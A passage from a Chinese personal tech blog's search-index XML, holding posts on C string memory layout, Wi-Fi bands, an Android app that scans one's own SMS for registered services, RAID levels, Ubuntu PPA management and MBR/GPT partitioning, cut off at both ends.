class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,str3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,str4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解了问题1，其实问题2也就迎刃而解了。str1和str2都指向了数据段中的“hello”（字符串常量在内存中仅有一份副本，str3和str4则是在栈区的数组，它们各持有”hello”的一份副本）。</p><p>所以str1 = str2(指向地址相同），而str3 != str4(两者首地址不同)。</p><p>你可将最后的4行printf注释取消，然后执行来查看。在我的电脑上的结果是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x400704</span></span><br><span class="line"><span class="number">0x400704</span></span><br><span class="line"><span class="number">0xb16ec5c0</span></span><br><span class="line"><span class="number">0xb16ec5d0</span></span><br></pre></td></tr></table></figure><p>看到了吧，前两个是低地址，也就是“hello‘所在数据段，后面都是高地址，也就是栈区。</p><p>OK，就到这里了，希望能帮到你，当然如有错误，也欢迎你的指正。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvbWVtb3J5LWxheW91dC1vZi1jLXByb2dyYW0v" title="https://www.geeksforgeeks.org/memory-layout-of-c-program/">Memory Layout of C Programs<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93b25neGluZ2p1bi5naXRodWIuaW8vMjAxNS8wNy8yNS9DJUU3JUE4JThCJUU1JUJBJThGJUU3JTlBJTg0JUU1JTg2JTg1JUU1JUFEJTk4JUU1JUI4JTgzJUU1JUIxJTgwLw==" title="https://wongxingjun.github.io/2015/07/25/C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">C程序的内存布局<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudG91dGlhby5jb20vaTY3MjA5ODQ3NTc5NzIyMzg4NTIv" title="https://www.toutiao.com/i6720984757972238852/">从编写源代码到程序在内存中运行的全过程解析<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NodW5fMTk1OS9hcnRpY2xlL2RldGFpbHMvMjE2NTA3NjE=" title="https://blog.csdn.net/chun_1959/article/details/21650761">C语言中字符串常量到底存在哪了？<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存布局 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>科普-2-4G和5G的Wi-Fi各自优缺点对比及“无线模式”解释</title>
      <link href="/archives/bf94a76e.html"/>
      <url>/archives/bf94a76e.html</url>
      
        <content type="html"><![CDATA[<p>以下信息均为个人理解，如有错误，还请指正。</p><blockquote><p>家里网络出了点问题，维修师傅上门修好后，看到我把路由器开了2个频段（2.4G和5G）对给我说，“没必要开5G，信号不好”，虽然我知道这个说法，但是我也听说5G下速度要快点的呀，于是就百度了一波。</p></blockquote><h2 id="先给结论"><a href="#先给结论" class="headerlink" title="先给结论"></a>先给结论</h2><ul><li>2.4G信号好，干扰强，可选信道窄，网速慢。</li><li>5G 信号差，干扰弱，可选信道宽，网速快。</li><li>正常情况下，无线模式都应该选择mixed模式。若确定自己的设备都支持n或ac等较新协议的，可使用only模式。<a id="more"></a><h2 id="1-为什么说5G信号不如2-4G？"><a href="#1-为什么说5G信号不如2-4G？" class="headerlink" title="1. 为什么说5G信号不如2.4G？"></a>1. 为什么说5G信号不如2.4G？</h2></li></ul><p>首先要知道一点，对于无线电波，波长越长的饶射能力越强，传播距离会更远。这是因为波长越长越容易发生衍射，就越能够“穿”墙。— <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODUlODklRTclOUElODQlRTglQTElOEQlRTUlQjAlODQ=" title="https://baike.baidu.com/item/%E5%85%89%E7%9A%84%E8%A1%8D%E5%B0%84">什么是衍射<i class="fa fa-external-link"></i></span></p><p>上面说得太抽象，下面应用工程中的计算公式来说明，在理想情况下，自由传播损耗可由下式来计算：<br>$$<br>L=32.5+20logF+20logD<br>$$<br>其中:</p><ul><li>L是自由传播损耗</li><li>F是电磁波频率</li><li>D是传播距离</li></ul><p>可以看到F（频率）越大，L（损耗）也就会越大。<strong>所以说5G频段的wifi信号的确会不如2.4G。</strong></p><h2 id="2-为什么说5G频段下的网速会高于2-4G？"><a href="#2-为什么说5G频段下的网速会高于2-4G？" class="headerlink" title="2. 为什么说5G频段下的网速会高于2.4G？"></a>2. 为什么说5G频段下的网速会高于2.4G？</h2><p>个人觉得可从两点来说。</p><ol><li><p>我们要知道一个概念–信道。这是什么呢？这就是把信息从路由器传到你手机上的一个通道。只不过它是以频率为单位的。在2.4G频段下，我国可使用的信道分为了13个。就好像一个大马路被分成了13条道，大家都可以在这13条道路中选择1条（实际上可以使用信道捆绑来同时使用多个信道,但是这里为了方便理解，就说只是用一条吧）开车，如果遇到这条道路已经有车（信道拥挤），我们可以切换到其他车道去（信道的自动切换）开，避免拥挤。然而，使用<strong>2.4G的设备实在太多了</strong>，你无法切到畅通的车道，造成了车辆堵塞，车速降低（网速降低）。反过来看看<strong>5G的设备</strong>，由于5G相较于2.4G是更新的技术，且制造的成本更高，所以<strong>相对2.4G来说，能够发射5G频段的路由器要少很多</strong>，这也就是意味着，在5G这个大马路上跑的车会很少，自然就不会堵塞咯。</p><p>2.4G下的信道图：</p><p><img data-src="https://ae01.alicdn.com/kf/Ha900e5c6422240f38b156eee210ebc79j.jpg"></p><p><strong>总之：2.4G的设备多，干扰强，所以网速慢。5G设备相对少，干扰弱，网速快。</strong></p><p>对比图如下：</p><p>2.4G：</p><img data-src="https://ae01.alicdn.com/kf/H895b7cca87d04c6789cd211539f99c28F.jpg" width="50%"/><p>5G：</p><img data-src="https://ae01.alicdn.com/kf/H1626991aacf1454ca57134733c8c85505.jpg" width="50%"/><p>可以明显看到2.4G下的wifi数量多于5G。</p></li><li><p>除了干扰问题外，2.4G和5G的信道带宽也不同。通过信道绑定，2.4G可达到40M的信道宽度，5G则可达到80M，甚至160M的宽度。而信道越宽，速度越快，这就好像车道越宽，能同时通过的车辆也就越多了。如：<br>2.4G:</p><p><img data-src="https://ae01.alicdn.com/kf/H62e967666e314900b87b681be3d4d191J.png"></p><p>5G:</p><p><img data-src="https://ae01.alicdn.com/kf/Ha23a4e93203c4b36bb26ab7c43074a41P.png"></p></li></ol><h2 id="3-什么是无线模式？b-g-n-这三个协议分别是什么？"><a href="#3-什么是无线模式？b-g-n-这三个协议分别是什么？" class="headerlink" title="3. 什么是无线模式？b g n 这三个协议分别是什么？"></a>3. 什么是无线模式？b g n 这三个协议分别是什么？</h2><p>b g n是针对2.4G频段的，对于5G频段的来说有a n ac。但是原理解释都差不多，所以说说b g n。</p><p>b g n全称其实为 IEEE 802.11b/g/n。它们对应的其实是3个无线局域网的标准。每个标准的峰值带宽是不同的：</p><ul><li><p>11b：就是11M </p></li><li><p>11g：就是54M </p></li><li><p>11n：就是150M或者300M </p></li></ul><p>设备要想连入路由器，需要支持对应的无线局域网标准。b g n速度依次升高，我们在路由器看到的b/g/n <strong>mixed</strong>和n <strong>only</strong>，前者指的是路由器允许支持b 或 g 或 n协议的设备连入，而后者则是仅允许支持n协议设备的接入。显然前者兼容性更强，正常情况我们也应该选择这种模式。那b/g/n mixed相对于n only来说有什么缺点呢？不然干嘛要使用n only模式。我在知乎上看到一条这样的回答：</p><blockquote><p>11n only：老子只带11n的设备，其他滚粗<br>11bgn mixed：bgn设备都可以进来，只有n设备时，老子带你装逼带你飞，如果有b、g设备进来时，不好意思，尊老爱幼，跟着最慢的一起跑。。</p></blockquote><p>所以说理论上，<strong>b/g/n mixed如果只有n设备连入，那它和n only没什么区别。但是一旦有b或g设备连入，整体速度就会降低。</strong></p><p>总之：一般情况，我们都应该选择b/g/n mixed模式。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pY3JvY29zbXYvYXJ0aWNsZS9kZXRhaWxzLzg1MjQ4MTI5" title="https://blog.csdn.net/microcosmv/article/details/85248129">为什么波长越长，衍射现象越明显？越容易传播的远？<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZXJ2aWNlLnRwLWxpbmsuY29tLmNuL2RldGFpbF9hcnRpY2xlXzMzNjYuaHRtbA==" title="https://service.tp-link.com.cn/detail_article_3366.html">.4G和5G的Wi-Fi各自优缺点对比<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI2Mjk4NDU2" title="https://www.zhihu.com/question/26298456">11n only和11bg mixed和11bgn mixed区别？<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SMSK-从短信中分析你的手机号注册过哪些公司账号</title>
      <link href="/archives/e939b5b6.html"/>
      <url>/archives/e939b5b6.html</url>
      
        <content type="html"><![CDATA[<p>先看demo：</p><img data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1565409156141/0" width="40%"><p>功能：</p><ol><li>分析短信，得到注册信息</li><li>一键导出注册信息为txt文本文件</li><li>点击任意item跳转到相关的百度搜索</li><li>觉得内嵌的浏览器难用，支持一键切换到系统安装的浏览器<a id="more"></a><h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2></li></ol><p>不关心的朋友可直接跳到第二节。</p><p><strong>这个APP是干什么的呢？</strong></p><p>其实就是从短信中分析出你注册过哪些网站或APP。</p><p><strong>为什么要做？</strong></p><p>先提一下我在本科使用的电话卡是学校的运营商卡，这张卡绑定了学校的宽带账号，每月都会进行扣费。但是今年我毕业了，忘记取消该套餐，这意味着我不使用学校的宽带，但是仍要计费。所以想着去取消这个套餐，但是被工作人员告知该套餐必须回到学校才能取消，学校暑假又不上班（坑比）。这就让我很为难了，几番考虑，决定还是换一张电话卡，可是我的电话卡实在<strong>绑定了太多网站和APP了</strong>，于是我百度了下看<strong>有什么方法能找到这些绑定信息不</strong>，发现有个网站<strong>REG007</strong>似乎可以查，花了点钱注册了这个网站，才发现NMD就显示了3个,<strong>所以这网站就有点坑了</strong>。最后准备放弃治疗的时候，突然看到手机短信应用里面有很多<strong>“验证码”短信</strong>（对于我个人来说，我的联系人，短信都是经常在云备份的，所以几乎保留了我使用这个手机号以来的所有短信）。于是我将短信导出到了电脑上，用python分析了一遍。然后想着可能有同学和我一样需要知道自己的手机号注册过哪些网站或APP，并且也<strong>保留了短信信息</strong>，所以就做了这个APP。当然了，这个APP也非常简单。</p><h2 id="2-正文"><a href="#2-正文" class="headerlink" title="2. 正文"></a>2. 正文</h2><p>这一节主要说一下怎么实现它，以及还有哪些问题。熟悉Android开发的朋友可能不到半小时就搞定吧，我做了小半天，主要遇到一个问题 。下面分开来说说。</p><h3 id="2-1-制作流程"><a href="#2-1-制作流程" class="headerlink" title="2.1 制作流程"></a>2.1 制作流程</h3><p>制作流程如下：</p><p>step1： 申请短信权限（6.0以后的系统）；</p><p>step2： 读取短信信息；</p><p>step3： 过滤出包含“验证码”关键字的短信；</p><p>step4： 使用正则表达式，抓出注册公司名。</p><p>APP的界面也设计得很简单，只有一个ListView（用不着RecyclerView吧）：</p><img data-src="https://ae01.alicdn.com/kf/He33bee112f0f47fdbf3067366a74f9bf6.jpg"  width=40%><h3 id="2-2-问题"><a href="#2-2-问题" class="headerlink" title="2.2 问题"></a>2.2 问题</h3><p>首先说说app已经做过的部分的问题：</p><ol><li><p>过滤包含”验证码“部分的短信，简单采用了String.contains(“验证码”)这类方法，是否会漏掉一些注册信息？</p></li><li><p>正则表达式部分，根据我的观察，几乎所有公司发来的短信都会将其公司名包含在一个中括号之间。如[豆瓣网]或【腾讯云】。中括号有英文和中文的两种。于是我只抓取了这两种。正则表达式如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String pattern = <span class="string">&quot;\[|【(.*?)\|]】&quot;</span>;</span><br></pre></td></tr></table></figure><p>在python中，我使用的正则表达式如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&quot;[[【]](.*?)[]】]</span></span><br></pre></td></tr></table></figure><p>那是否有些公司不是这样呢？还有正则表达式其实有个漏洞那就是[腾讯云】。这种也会捕获，但是正规公司发过来的短信，不会有这种短信吧。</p></li></ol><p>好，再来说说我花了很多时间的未做的部分：</p><p>首先这个APP我在是准备识别双卡的。因为我的手机就是双卡的，我想知道<strong>卡一和卡二分别注册了哪些网站</strong>，这一定程度上受了“华为手机助手”的诱导。我在“背景”中说过，我首先是用python分析的，从手机中将信息导入到电脑上，华为手机助手给我生成了一个csv文件。csv的header如下：</p><p><img data-src="https://ae01.alicdn.com/kf/H1c8467db520248369e39e1a28f80376bH.jpg"></p><p>SIMCardID分了双卡的。所以我觉得既然可以识别双卡，那就<strong>做成双卡识别</strong>咯。谷歌了很久，查Android Api也查看了很久。首先是读取短信的cursor所用projection字段中没有相关字段信息，其次大多的博客也是探讨“如何用副卡来发送短信”的话题。如何识别“短信是属于那张卡的”之类的问题却少之又少。花了2,3个小时在查资料上，却无果。<strong>我又去看了那个csv文件，发现它的识别居然是有错的！</strong>之后我又想到，既然我用过云备份短信，那从云中恢复短信时它怎么知道每个短信是属于哪张卡的？万一我换过卡？又或者我将卡槽中的两张卡交换了位置呢？所以很显然这有问题。于是我又去查了自己手机中好几年前的短信（因为我这几年都换过手机了，所以肯定有从云备份中恢复的短信），发现只要是旧信息，都是<strong>默认归属于主卡</strong>的。</p><h3 id="2-3-不完美的解决方案"><a href="#2-3-不完美的解决方案" class="headerlink" title="2.3 不完美的解决方案"></a>2.3 不完美的解决方案</h3><p>文字略显多了，总之这个功能无法做到精确。但是也不是说不可以做，cursor的projection字段有一个serveice_center，这个是用来查短信中心的，我看了下，如果短信属于主卡，是有短信中心的信息的，而对于卡2，短信中心号码默认为0。当然了，因为要考虑我在2.2节中说过的问题，所以这只是一种“不完美的解决方案”。</p><p>开源地址：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1NNU0s=" title="https://github.com/ravenxrz/SMSK">https://github.com/ravenxrz/SMSK<i class="fa fa-external-link"></i></span></p><p>APK下载地址：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1NNU0svcmVsZWFzZXMvZG93bmxvYWQvdjAuMi9zbXNrLmFwaw==" title="https://github.com/ravenxrz/SMSK/releases/download/v0.2/smsk.apk">https://github.com/ravenxrz/SMSK/releases/download/v0.2/smsk.apk<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 短信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识扫盲-RAID0，RAID1，RAID5，RAID6，RAID10简介</title>
      <link href="/archives/f0834f1f.html"/>
      <url>/archives/f0834f1f.html</url>
      
        <content type="html"><![CDATA[<p>整理自youtube视频：</p><ol><li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1VLU9DZFRlWkxhYw==" title="https://www.youtube.com/watch?v=U-OCdTeZLac">https://www.youtube.com/watch?v=U-OCdTeZLac<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1VdVVnZkN2dDktUSZhbXA7dD0yOXM=" title="https://www.youtube.com/watch?v=UuUgfCvt9-Q&amp;t=29s">https://www.youtube.com/watch?v=UuUgfCvt9-Q&amp;t=29s<i class="fa fa-external-link"></i></span></li></ol><p>如有错误，还请指正。</p><p>RAID（Redundant Arrays of Independent Drives），中文名：独立磁盘冗余阵列。</p><a id="more"></a><h3 id="为什么要有RAID呢？"><a href="#为什么要有RAID呢？" class="headerlink" title="为什么要有RAID呢？"></a>为什么要有RAID呢？</h3><p>我们都是知道存在磁盘中的数据是有可能丢失的，通过RAID中的“冗余“功能，我们可以一定程度的解决这个问题。</p><p>i&gt; RAID有好几种，每种功能不同，适用的场合不同，常见的RAID有5种，分别是RAID0,RAID1,RAID5,RAID6和RAID10,下面就分别来介绍一下这几种RAID，说下他们的功能以及优缺点。</p><h2 id="1-RAID-0"><a href="#1-RAID-0" class="headerlink" title="1. RAID 0"></a>1. RAID 0</h2><p>RAID 0是RAID中稍微特殊的一类，因为它不仅不能缓和数据丢失的情况，反而加重了数据丢失难以恢复的情况。为什么会这样呢？先来看看它的原理，如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/He0ee05d95b9e4d659f3a46fda3660525l.jpg"></p><p>可以看到，数据来了以后，兵分两路，同时写入到两块磁盘中，这意味着，<strong>任意一块磁盘损坏后，整个数据都会丢失</strong>。那RAID 0有啥用？当然是IO速度加快咯。你想想现在数据可以同时向两块磁盘里写，肯定比原来一块磁盘块嘛。而且理论上磁盘越多速度越快。当然数据丢失的风险也会增加。</p><ul><li><p>优点：io速度加快</p></li><li><p>缺点：数据更易丢失</p></li></ul><h2 id="2-RAID-1"><a href="#2-RAID-1" class="headerlink" title="2. RAID 1"></a>2. RAID 1</h2><p>RAID 1也至少需要两块磁盘，原理图如下：</p><p><img data-src="https://ae01.alicdn.com/kf/Hb416c7e77b8e41bf93b5a8a5e7337606p.jpg"></p><p>RAID 1的数据也是同时写入两块磁盘，与RAID0不同的是，RAID 1是将同一份数据分别写入到两块磁盘中。这样磁盘1相当于就是磁盘0的完全备份，当任一块磁盘损坏后，数据都不会受到影响。</p><p>现在我们来想想RAID1的优缺点：</p><ul><li>优点：可以有一份完整的磁盘备份，当其中一块磁盘损坏后，数据不至于丢失。</li><li>缺点：假定我们使用了两块磁盘，那么就会损失50%的存储空间。</li></ul><h2 id="3-RAID-10"><a href="#3-RAID-10" class="headerlink" title="3. RAID 10"></a>3. RAID 10</h2><p>咱们先来说RAID10，之后再来谈RAID5和6。 RAID10，其实并不是10（十），他是1和0的结合体。也就是说，他综合了RAID0和RAID1。使用RAID10，我们至少需要4块磁盘，原理图如下：</p><p><img data-src="https://ae01.alicdn.com/kf/H089e91c047ce4e8a9d1dc911b2a75eabt.jpg"></p><p>数据来了以后，首先遇到的是RAID0，还记得RAID0的特点吗？数据可以从这里分流，同时写入到两个分流中去。（速度加倍）。为了保证数据不那么容易丢失，在RAID0之后，紧跟了RAID1，也就是说数据将在这里“备份”，复制出一份副本，然后分别将原数据和副本写入到RAID1下面的两块磁盘中。</p><p>优点：综合了RAID0和RAID 1的优点。</p><p>缺点: 和RAID1 一样，浪费了一半的空间。</p><h2 id="4-RAID-5"><a href="#4-RAID-5" class="headerlink" title="4. RAID 5"></a>4. RAID 5</h2><p>RAID 5 是被广泛使用的一种RAID，它至少需要3张磁盘，存储图如下：</p><p><img data-src="https://ae01.alicdn.com/kf/Hc8771685928f4d9d8af3b66dfc109f1bp.jpg"></p><p>数据可被同时存入其中3块磁盘，其中一块磁盘用于存储辅助信息– PARITY。同时可以观察到，PARITY的排布是有一定规律的，如果磁盘共有4块，并将磁盘阵列看成一个矩阵的话，它会以每一行左移位（右移位）出现。如第1行在第4列出现，第2行在第3列出现，以此类推（个人猜想是为了负载均衡，毕竟不这样排列，也能复原数据）。</p><p>当任一块磁盘出现崩溃，我们可以借助其余三块磁盘来复原它，如此重建数据。</p><p>那么它是如何重建数据的呢？首先得知道PARITY这个东西是什么。其实很简单，PARITY就是同一行其余数据求异或所得到的结果。如第一行：<br>$$<br>PARITY = A 异或 B 异或 C<br>$$<br>如: A = 1 B = 0 C = 1， 那么PARITY = 0。</p><p>假设现在数据C丢失了。那么可通过异或将C重建。<br>$$<br>C = PARITY 异或 A 异或 B<br>$$<br>在之类 A = 1, B = 0 , PARITY = 0。于是C = 0 异或 1 异或 0 = 1。</p><ul><li>优点：数据得到了一定的保障。</li><li>缺点：损失了一块磁盘的存储容量。如果用4块磁盘来组RAID5, 那么浪费率为25%。</li></ul><p>现在，我们在稍微延展一点，如果有两块磁盘都崩溃了呢？</p><p>sorry，RAID5没办法复原了。这意味着有两块磁盘崩溃，所有数据都没有了。于是产生了RAID6</p><h2 id="5-RAID-6"><a href="#5-RAID-6" class="headerlink" title="5. RAID 6"></a>5. RAID 6</h2><p>RAID6和RAID5类似，但是它需要至少4块磁盘，且在一行中存储两个PARITY。如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H7dfb85fc8614468393c7d11f7a90479fE.jpg"></p><p>当然了，此时的PARITY可就没那么简单了。牵扯一定的域论知识，超出本文的探讨范围内。如果要想了解，可参考：</p><p><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvUkFJRCNSQUlEXzY=" title="https://zh.wikipedia.org/wiki/RAID#RAID_6">https://zh.wikipedia.org/wiki/RAID#RAID_6<i class="fa fa-external-link"></i></span></p><ul><li>优点：很强的容错性，同时丢失两块磁盘，也可重建</li><li>缺点: 容量浪费大，读速度等同于RAID5，但是写速度低于RAID5，因为要写入两个PARITY。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> raid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu包管理的小知识</title>
      <link href="/archives/14ea3ef9.html"/>
      <url>/archives/14ea3ef9.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ubuntu-PPA小知识"><a href="#Ubuntu-PPA小知识" class="headerlink" title="Ubuntu PPA小知识"></a>Ubuntu PPA小知识</h2><p>PPA,表示Personal Package Archives,也就是个人软件包集。再说白点就是非官方源。</p><a id="more"></a><h3 id="为什么要用PPA？"><a href="#为什么要用PPA？" class="headerlink" title="为什么要用PPA？"></a>为什么要用PPA？</h3><p>有些包吧，不能进入到官方源去。或者说要进入到官方源中的周期过长，用户很难得到及时的更新，于是需要使用PPA。PPA由launchpad.net提供，个人用户可将包发布在上面。</p><h2 id="1-添加PPA"><a href="#1-添加PPA" class="headerlink" title="1. 添加PPA"></a>1. 添加PPA</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ppa-user/ppa-name</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:atareao&#x2F;atareao</span><br></pre></td></tr></table></figure><p>添加ppa源后，需要依次执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update # 更新源数据库，会在/etc/apt/sources.list.d目录下生成一个源文件，用于存放包地址。</span><br><span class="line"><span class="meta">#</span><span class="bash"> 为什么不放在/etc/apt/sources.list 下，是因为不要和主源混淆了</span></span><br><span class="line">sudo apt install xxx</span><br></pre></td></tr></table></figure><h2 id="2-删除PPA"><a href="#2-删除PPA" class="headerlink" title="2. 删除PPA"></a>2. 删除PPA</h2><h3 id="2-1-方法一"><a href="#2-1-方法一" class="headerlink" title="2.1 方法一"></a>2.1 方法一</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository -r ppa:atareao/atareao</span><br></pre></td></tr></table></figure><p>这个方法是ubuntu自带的，但是需要你记得ppa源的具体名称，比较麻烦，不推荐。</p><h3 id="2-2-方法二"><a href="#2-2-方法二" class="headerlink" title="2.2 方法二"></a>2.2 方法二</h3><p>暴力删除，其实添加ppa,说白了就是在<code>/etc/apt/sources.list.d</code>目录下生成一个对应的源文件，我们可以找到该文件，暴力删除即可。</p><p>暴力方法嘛，也不太推荐。</p><h3 id="2-2-方法三"><a href="#2-2-方法三" class="headerlink" title="2.2 方法三"></a>2.2 方法三</h3><p>安装<code>ppa-purge</code>工具，然后删除。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ppa-purge </span><br><span class="line">sudo ppa-purge ppa:/atareao/atarea</span><br></pre></td></tr></table></figure><p>注意，这里的ppa是可以通过tab补全的，所以不需要记住全称。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2d1b2Rvbmd4aWFyZW4vTGludXhUb29sL2Jsb2IvbWFzdGVyL0FQVC5tZA==" title="https://github.com/guodongxiaren/LinuxTool/blob/master/APT.md">LinuxTool<i class="fa fa-external-link"></i></span></li></ul><h2 id="3-你知道APT和APT-Get的区别吗"><a href="#3-你知道APT和APT-Get的区别吗" class="headerlink" title="3. 你知道APT和APT-Get的区别吗"></a>3. 你知道APT和APT-Get的区别吗</h2><ul><li>apt其实是apt-get和apt-cache的一个子集，它提供了更方便的options给用户，方便用户统一调用。</li><li>apt-get不会过时，因为它可以更细颗度的管理包，但是对于常规linux用户，使用apt管理更方便。</li></ul><p>这里简单列一下apt与apt-get在选项上的差别：</p><table><thead><tr><th align="center">apt command</th><th align="center">the command it replaces</th><th align="center">function of the command</th></tr></thead><tbody><tr><td align="center">apt install</td><td align="center">apt-get install</td><td align="center">Installs a package</td></tr><tr><td align="center">apt remove</td><td align="center">apt-get remove</td><td align="center">Removes a package</td></tr><tr><td align="center">apt purge</td><td align="center">apt-get purge</td><td align="center">Removes package with configuration</td></tr><tr><td align="center">apt update</td><td align="center">apt-get update</td><td align="center">Refreshes repository index</td></tr><tr><td align="center">apt upgrade</td><td align="center">apt-get upgrade</td><td align="center">Upgrades all upgradable packages</td></tr><tr><td align="center">apt autoremove</td><td align="center">apt-get autoremove</td><td align="center">Removes unwanted packages</td></tr><tr><td align="center">apt full-upgrade</td><td align="center">apt-get dist-upgrade</td><td align="center">Upgrades packages with auto-handling of dependencies</td></tr><tr><td align="center">apt search</td><td align="center">apt-cache search</td><td align="center">Searches for the program</td></tr><tr><td align="center">apt show</td><td align="center">apt-cache show</td><td align="center">Shows package details</td></tr></tbody></table><p>以上解释摘自：<span class="exturl" data-url="aHR0cHM6Ly9pdHNmb3NzLmNvbS9hcHQtdnMtYXB0LWdldC1kaWZmZXJlbmNlLw==" title="https://itsfoss.com/apt-vs-apt-get-difference/">https://itsfoss.com/apt-vs-apt-get-difference/<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
            <tag> 包管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识整理-分区表MBR与GPT</title>
      <link href="/archives/7543dac6.html"/>
      <url>/archives/7543dac6.html</url>
      
        <content type="html"><![CDATA[<p>本文整理自《鸟哥的Linux私房菜-基础学习篇》及几篇博客。</p><p>咱们拿到一个块磁盘是不能马上使用的，需要对磁盘进行分区，再格式化为某个文件系统（如windows上常用的NTFS和Linux下的Ext家族）才能使用。今天咱们的重点就放在<strong>磁盘分区</strong>上。当然了本文可不是教你怎么用工具或命令去分区，而是分区当中的重要部分–分区表。</p><a id="more"></a><h2 id="1-传统磁盘结构"><a href="#1-传统磁盘结构" class="headerlink" title="1. 传统磁盘结构"></a>1. 传统磁盘结构</h2><p>常用的分区表有MBR何GPT两种。但是在说这两者之前我们需要了解传统磁盘的物理结构:磁盘的组成主要有盘片、机械手臂、磁头与主轴马达所组成， 而数据的写入其实是在盘片上。所以我们主要关注的也就是这个存储数据的<strong>盘片</strong>。</p><p><em>以下解释来自文章：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9taW50aGVyZS9hcnRpY2xlL2RldGFpbHMvMTk3NTY1NTE=" title="https://blog.csdn.net/xiaominthere/article/details/19756551">https://blog.csdn.net/xiaominthere/article/details/19756551<i class="fa fa-external-link"></i></span></em></p><p><img data-src="https://ae01.alicdn.com/kf/Hcdfe9f680f0b4053afbe408bfb7d9180m.jpg" width="300"/><img data-src="https://ae01.alicdn.com/kf/Hcdcf64418a0a4159a0515d7cc54666f58.jpg" width="300"/><img data-src="https://ae01.alicdn.com/kf/H7359a44216a9468c827931a3f0bdbc64P.jpg" 